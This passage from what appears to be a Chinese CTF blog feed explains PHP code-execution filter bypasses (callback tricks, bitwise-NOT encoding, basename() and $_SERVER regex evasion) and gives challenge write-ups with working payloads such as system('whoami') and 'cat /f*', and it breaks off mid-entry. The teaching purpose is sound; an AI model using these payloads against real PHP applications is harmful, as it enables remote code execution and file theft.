plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST：</span><br><span class="line">cmd=$_POST[1]($_POST[2]);&amp;1=system&amp;2=whoami</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221193023823.png" alt="image-20231221193023823"></p><p>如果php&gt;7</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">1=system(&#x27;whoami&#x27;);</span><br><span class="line">POST:</span><br><span class="line">cmd=eval($_GET[1]);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221193244064.png" alt="image-20231221193244064"></p><p>如果回调函数限制长度，在5.6&lt;php&lt;7中：</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?1[]=1&amp;1[]=phpinfo()&amp;2=assert</span><br><span class="line">POST:</span><br><span class="line">cmd=usort(...$_GET);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221194557136.png" alt="image-20231221194557136"></p><h2 id="内置函数访问绕过"><a href="#内置函数访问绕过" class="headerlink" title="内置函数访问绕过"></a>内置函数访问绕过</h2><p><strong>php&gt;&#x3D;7</strong></p><p><strong>get_defined_functions()</strong>:返回所有已定义函数的数组</p><p>注意不同php版本get_defined_functions()返回值不同</p><p>这里以<strong>php7.4.3</strong>为例</p><p>266-&gt;phpinfo</p><p>358-&gt;system</p><p><img src="/../images/image-20231221195549029.png" alt="image-20231221195549029"></p><p><img src="/../images/image-20231221195729256.png" alt="image-20231221195729256"></p><h2 id="URL编码绕过"><a href="#URL编码绕过" class="headerlink" title="URL编码绕过"></a>URL编码绕过</h2><p>exam:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤所有字母和数字，利用取反构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(urlencode(~&#x27;phpinfo&#x27;));</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br><span class="line">phpinfo()</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221201442771.png" alt="image-20231221201442771"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(~%8C%86%8C%8B%9A%92)(~%88%97%90%9E%92%96);</span><br><span class="line">system(whoami)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221201612330.png" alt="image-20231221201612330"></p><p>当<strong>5&lt;&#x3D;php&lt;&#x3D;7.0.9</strong>时，需要再执行一次构造出来的字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">$_=(~&#x27;%9E%8C%8C%9A%8D%8B&#x27;);$__=&#x27;_&#x27;.(~&#x27;%AF%B0%AC%AB&#x27;);$___=$$__;$_($___[_]);</span><br><span class="line">POST:</span><br><span class="line">_=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231221201753001.png" alt="image-20231221201753001"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;代码执行函数&quot;&gt;&lt;a href=&quot;#代码执行函数&quot; class=&quot;headerlink&quot; title=&quot;代码执行函数&quot;&gt;&lt;/a&gt;代码执行函数&lt;/h2&gt;&lt;h3 id=&quot;eval&quot;&gt;&lt;a href=&quot;#eval&quot; class=&quot;headerlink&quot; title=&quot;e</summary>
      
    
    
    
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>$_SERVER参数和basename函数绕过</title>
    <link href="http://example.com/2023/12/19/post/"/>
    <id>http://example.com/2023/12/19/post/</id>
    <published>2023-12-19T11:15:31.000Z</published>
    <updated>2023-12-19T11:16:33.933Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SERVER参数和basename函数绕过"><a href="#SERVER参数和basename函数绕过" class="headerlink" title="$_SERVER参数和basename函数绕过"></a>$_SERVER参数和basename函数绕过</h1><h2 id="SERVER参数"><a href="#SERVER参数" class="headerlink" title="$_SERVER参数"></a>$_SERVER参数</h2><p>$_SERVER是PHP预定义变量之一，可以直接使用，它是一个包含了注入头信息(header)、路径(path)及脚本位置(script location)信息的数组。</p><p>exam:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://aaa.com/php/index.php/test/foo?username=root</span><br></pre></td></tr></table></figure><p><strong>$_SERVER[‘PHP_SELF’]当前执行脚本的文件名:</strong></p><p>php&#x2F;index.php&#x2F;test&#x2F;foo</p><p><strong>$_SERVER[‘REQUEST_URI’]URI用来指定要访问的页面:</strong> </p><p>php&#x2F;index.php&#x2F;test&#x2F;foo?username&#x3D;root</p><p>并且$_SERVER[‘REQUEST_URI’]$_SERVER[‘REQUEST_URI’]不会将参数中的特殊符号进行转换，也就是说它并不会进行URL解码</p><h2 id="basename函数"><a href="#basename函数" class="headerlink" title="basename函数"></a>basename函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">basename(path,suffix)</span><br></pre></td></tr></table></figure><p>返回路径中的文件名部分</p><p>exam:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$path</span> = <span class="string">&quot;user01/home/documents/geeksforgeeks.php&quot;</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$path</span>); </span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geeksforgeeks.php</span><br></pre></td></tr></table></figure><h1 id="鹤城杯-2021-EasyP"><a href="#鹤城杯-2021-EasyP" class="headerlink" title="[鹤城杯 2021]EasyP"></a>[鹤城杯 2021]EasyP</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$guess</span> === <span class="variable">$secret</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>首先看第一个正则判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$_SERVER[‘PHP_SELF’]的值会赋给basename()函数</p><p>但是在默认环境中basename()会删除文件名开头非ASCII字符和中文</p><p>可以利用这一点来绕过这层正则判断</p><p>继续看第二个正则判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>URL编码绕过</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28090/index.php/utils.php/卧槽?%73how_source</span><br></pre></td></tr></table></figure><p>当我们传入index.php&#x2F;utils.php&#x2F;时basename()函数会将其解析成utils.php，而这里的卧槽是绕过第一个正则，basename()会将其删除，而%73是为了绕过第二个正则。</p><p><img src="/../images/image-20231219190928665.png" alt="image-20231219190928665"></p><h1 id="琢光杯-2023-天命之子"><a href="#琢光杯-2023-天命之子" class="headerlink" title="[琢光杯 2023] 天命之子"></a>[琢光杯 2023] 天命之子</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sou_rc.e&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ars</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$sec</span>=<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">100000</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$sec</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$ars</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解题思路跟上题一样</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/flag.php/卧槽?sou[rc.e</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SERVER参数和basename函数绕过&quot;&gt;&lt;a href=&quot;#SERVER参数和basename函数绕过&quot; class=&quot;headerlink&quot; title=&quot;$_SERVER参数和basename函数绕过&quot;&gt;&lt;/a&gt;$_SERVER参数和basename函数</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>琢光杯新生赛wp(web)</title>
    <link href="http://example.com/2023/12/15/%E7%90%A2%E5%85%89%E6%9D%AF%E6%96%B0%E7%94%9F%E8%B5%9Bwp-web/"/>
    <id>http://example.com/2023/12/15/%E7%90%A2%E5%85%89%E6%9D%AF%E6%96%B0%E7%94%9F%E8%B5%9Bwp-web/</id>
    <published>2023-12-15T11:42:17.000Z</published>
    <updated>2023-12-15T11:43:25.759Z</updated>
    
    <content type="html"><![CDATA[<h1 id="天命之子"><a href="#天命之子" class="headerlink" title="天命之子"></a>天命之子</h1><p>打开环境</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ &quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sou_rc.e&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>    <br>    <br>    <br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-variable">$ars</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$sec</span>=<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$sec</span>)==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$ars</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>basename+正则绕过</p><p>脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">255</span>;<span class="hljs-variable">$i</span>++)&#123;<br><span class="hljs-variable">$s</span>=<span class="hljs-string">&#x27;/index.php/config.php/&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$s</span>))&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-string">&#x27;/index.php/config.php/&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(i));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;$&#123;i&#125;:$&#123;t&#125;\n&quot;</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">/<span class="hljs-keyword">index</span>.php/flag.php/<span class="hljs-title function_">%ff</span>?sou[rc.e<br></code></pre></td></tr></table></figure><p><img src="/../images/image-20231215190234449.png" alt="image-20231215190234449"></p><h1 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h1><p>打开环境</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$action</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>];<br><span class="hljs-variable">$parameters</span> = <span class="hljs-variable">$_GET</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$parameters</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$parameters</span>[<span class="hljs-string">&#x27;action&#x27;</span>]);<br>&#125;<br><br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$action</span>, <span class="hljs-variable">$parameters</span>)(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>current会输出数组当前元素值</p><p>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">action</span>=current&amp;a=current<br>POST:<br>a[]=system&amp;<span class="hljs-attribute">b</span>=cat /f*<br></code></pre></td></tr></table></figure><p><img src="/../images/image-20231215190559981.png" alt="image-20231215190559981"></p><h1 id="serialize-escape"><a href="#serialize-escape" class="headerlink" title="serialize_escape"></a>serialize_escape</h1><p>提示<a href="http://www.zip有好东西/">www.zip有好东西</a></p><p>下载</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 